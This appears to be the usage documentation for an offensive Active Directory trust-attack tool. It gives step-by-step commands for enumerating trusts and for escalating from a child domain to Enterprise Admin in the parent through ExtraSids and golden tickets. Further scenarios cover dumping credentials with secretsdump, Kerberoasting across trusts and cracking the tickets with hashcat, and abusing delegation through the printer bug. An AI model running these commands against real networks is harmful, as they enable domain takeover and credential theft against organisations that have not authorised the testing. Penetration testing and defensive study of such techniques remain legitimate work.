# Usage Examples

## Scenario 1: Initial Domain Compromise

You've compromised a user account in a child domain and want to understand the trust landscape.

### Step 1: Enumerate Local Domain

```bash
trustfull enumerate child.corp.local/user:password -dc-ip 10.0.0.10
```

This shows:
- Trust relationships
- Security properties (SID filtering, selective auth)
- Attack surface recommendations

### Step 2: Enumerate Trusted Domains

```bash
trustfull enumerate child.corp.local/user:password -dc-ip 10.0.0.10 --cross-trust
```

This detects:
- Kerberoastable accounts in parent domain
- ASREProastable accounts in parent domain
- Unconstrained delegation hosts
- Constrained delegation configurations
- RBCD configurations

### Step 3: Check for Foreign Principals

```bash
trustfull enumerate child.corp.local/user:password -dc-ip 10.0.0.10 --foreign-principals
```

This identifies:
- Foreign security principals in local groups
- Cross-domain ACLs on sensitive objects
- Privilege escalation paths

---

## Scenario 2: Domain Admin in Child Domain

You've escalated to Domain Admin in a child domain and want to compromise the parent.

### Step 1: Verify Trust Type

```bash
trustfull enumerate child.corp.local/admin -hashes :hash -dc-ip 10.0.0.10
```

Check the output for:
- Trust type: ParentChild
- SID filtering: DISABLED
- Attack surface: badChild -- ExtraSids

### Step 2: Execute ExtraSids Attack

Using trust key method (recommended):

```bash
trustfull badChild child.corp.local/admin -hashes :hash -dc-ip 10.0.0.10 --trust-key
```

Using golden ticket method:

```bash
trustfull badChild child.corp.local/admin -hashes :hash -dc-ip 10.0.0.10 --golden
```

### Step 3: Use the Ticket

```bash
export KRB5CCNAME=child.corp.local_admin.ccache
impacket-secretsdump -k -no-pass parent.corp.local/Administrator@DC1.parent.corp.local
```

You now have Enterprise Admin privileges in the parent domain.

---

## Scenario 3: External Trust Enumeration

You're in one forest and want to enumerate a trusted external forest.

### Step 1: Enumerate Foreign Domain

```bash
trustfull enumerate forest1.local/user:password -dc-ip 10.0.0.10 --cross-trust
```

### Step 2: Look for Foreign Group Membership

```bash
trustfull enumerate forest1.local/user:password -dc-ip 10.0.0.10 --foreign-principals
```

Check output for:
- Users from forest1 in forest2 groups
- Foreign ACLs on forest2 objects

### Step 3: Target Specific Accounts

If you find a forest1 user in a privileged forest2 group, compromise that account and pivot.

---

## Scenario 4: Delegation Abuse

### Find Unconstrained Delegation Targets

```bash
trustfull enumerate domain.local/user:password -dc-ip 10.0.0.1
```

Look for:
```
[*] Unconstrained Delegation Hosts in domain.local
  SERVER01$    <-- non-DC, prime TGT capture target
```

These servers can be used for:
- Printer bug attacks (MS-RPRN)
- TGT capture and reuse

### Find Constrained Delegation

```bash
trustfull enumerate domain.local/user:password -dc-ip 10.0.0.1
```

Look for:
```
[*] Constrained Delegation Accounts in domain.local
  svc-sql    (protocol transition)
    -> CIFS/DC1
    -> HTTP/DC1
```

This account can impersonate any user to those services.

### Find RBCD Configurations

```bash
trustfull enumerate domain.local/user:password -dc-ip 10.0.0.1 --foreign-principals
```

Look for:
```
[*] Resource-Based Constrained Delegation in domain.local
  WEB-SERVER$
    <- domain.local\lowpriv-user
```

This means lowpriv-user can obtain service tickets to WEB-SERVER as any user.

---

## Scenario 5: Foreign ACL Hunting

You want to find cross-domain privilege escalation paths.

### Enumerate from Target Domain

```bash
trustfull enumerate target.local/admin -hashes :hash -dc-ip 10.0.0.20 --foreign-principals
```

Look for output like:
```
[*] Foreign ACL Principals in target.local
  [!] source.local\user (S-1-5-21-...) has GenericAll on Domain Admins
  [!] source.local\user (S-1-5-21-...) has WriteDACL on Administrator
```

These are direct privilege escalation paths from source.local to target.local.

---

## Scenario 6: Kerberoasting Across Trusts

### Enumerate SPNs in Trusted Domain

```bash
trustfull enumerate child.local/user:password -dc-ip 10.0.0.10 --cross-trust
```

Output provides the exact command:
```
[*] Kerberoastable accounts in parent.local:
  [!] svc-web    SPNs: HTTP/web.parent.local
  --> impacket-GetUserSPNs -target-domain parent.local child.local/user
```

### Request and Crack Tickets

```bash
impacket-GetUserSPNs -target-domain parent.local child.local/user:password -request
hashcat -m 13100 tickets.txt wordlist.txt
```

---

## Authentication Methods

### Password Authentication

```bash
trustfull enumerate domain.local/user:MyPassword123 -dc-ip 10.0.0.1
```

### NTLM Hash Authentication

```bash
trustfull enumerate domain.local/user -hashes aad3b435b51404eeaad3b435b51404ee:ntlmhash -dc-ip 10.0.0.1
```

Or without LM hash:

```bash
trustfull enumerate domain.local/user -hashes :ntlmhash -dc-ip 10.0.0.1
```

### Kerberos Authentication

```bash
export KRB5CCNAME=/path/to/ticket.ccache
trustfull enumerate domain.local/user -k -no-pass -dc-ip 10.0.0.1
```

### AES Key Authentication

```bash
trustfull enumerate domain.local/user -aesKey <hex_key> -dc-ip 10.0.0.1
```

---

## Output Interpretation

### Trust Properties

```
-- Security Properties --
SID filtering:        DISABLED  <-- ExtraSids attacks possible
Selective auth:       Disabled
TGT delegation:       Default (not set)
```

**DISABLED SID filtering** means ExtraSids attacks work (parent-child trusts).

**Selective authentication** restricts which users can authenticate across the trust.

**TGT delegation** controls whether delegated TGTs can cross trust boundaries.

### Attack Surface

```
-- Attack Surface --
[!!] badChild -- ExtraSids (trust key)
     Child-to-parent escalation via inter-realm ticket + EA SID
     --> trustfull badChild --trust-key
```

Red `[!!]` indicates critical vulnerabilities (direct privilege escalation).

Yellow `[!]` indicates exploitable misconfigurations.

Blue `[*]` indicates informational findings.

### Delegation Findings

```
[*] Unconstrained Delegation Hosts in domain.local
  DC1$           DC1.domain.local (DC)
  SERVER01$      <-- non-DC, prime TGT capture target
```

Non-DC unconstrained delegation hosts are high-value targets for printer bug attacks.

```
[*] Constrained Delegation Accounts in domain.local
  svc-app    (protocol transition)
    -> CIFS/DC1
```

Protocol transition means the account can impersonate any user without requiring their TGT.

---

## Tips and Best Practices

**Start with Basic Enumeration**

Always run basic enumeration first to understand the trust landscape before attempting cross-trust queries.

**Use --foreign-principals Selectively**

The `--foreign-principals` flag performs extensive ACL scanning which can be slow. Use it when you need detailed privilege escalation paths.

**Verify Network Connectivity**

Cross-trust enumeration requires network access to target domain controllers. If queries fail, verify you can reach the target DC IP.

**Combine with Other Tools**

TrustFull provides enumeration and initial access. Combine with:
- impacket-secretsdump for credential extraction
- impacket-GetUserSPNs for Kerberoasting
- impacket-GetNPUsers for ASREProasting
- Rubeus for advanced Kerberos attacks

**Check Trust Direction**

Remember that trust direction is opposite to access direction. If Domain A trusts Domain B, users in B can access resources in A.

---

## Troubleshooting

**"Error in searchRequest -> referral"**

This means the DC is referring you to another domain. Ensure you have network access to the target domain controller.

**"nTSecurityDescriptor not readable"**

You need Domain Admin privileges in the target domain to read security descriptors.

**"KDC_ERR_TGT_REVOKED" with badChild**

Ensure you're using the `--trust-key` method, which is more reliable on modern Windows.

**No results from --cross-trust**

Verify:
- Trust relationship exists and is bidirectional or inbound
- Network connectivity to target DC
- Credentials are valid in source domain
